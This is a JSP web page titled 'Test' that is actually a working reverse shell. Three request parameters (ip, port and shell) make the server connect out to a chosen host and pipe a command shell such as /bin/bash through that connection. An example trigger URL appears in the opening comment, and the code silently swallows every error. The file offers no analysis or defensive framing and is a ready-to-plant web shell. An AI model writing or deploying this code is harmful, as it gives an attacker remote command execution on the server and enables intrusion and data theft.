<%-- Ex. http://192.168.1.1:8080/test.jsp?ip=192.168.1.100&port=8080&shell=/bin/bash --%>
<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%>
<%!
static class StreamConnector extends Thread {

    InputStream is;
    OutputStream os;

    StreamConnector(InputStream is, OutputStream os) {
        this.is = is;
        this.os = os;
    }

    public void run() {

        BufferedReader in = null;
        BufferedWriter out = null;

        try {
            in = new BufferedReader(new InputStreamReader(is));
            out = new BufferedWriter(new OutputStreamWriter(os));
            char buffer[] = new char[8192];
            int lenRead;
            while( (lenRead = in.read(buffer, 0, buffer.length)) > 0) {
                out.write(buffer, 0, lenRead);
                out.flush();
            }
        } catch (Exception exc) {}

        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
        } catch (Exception exc) {}
    }
}
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Test</title>
</head>
<body>
    <h1>Test</h1>
</body>
</html>
<%
String ip = request.getParameter("ip");
String port = request.getParameter("port");
String shell = request.getParameter("shell");

if (ip != null && port != null && shell != null) {
    try {
        Socket sock = new Socket(ip, (new Integer(port)).intValue());
        Process proc = Runtime.getRuntime().exec(shell);
        StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());
        StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());
        outputConnector.start();
        inputConnector.start();
    }
    catch (Exception exc) {}
}
%>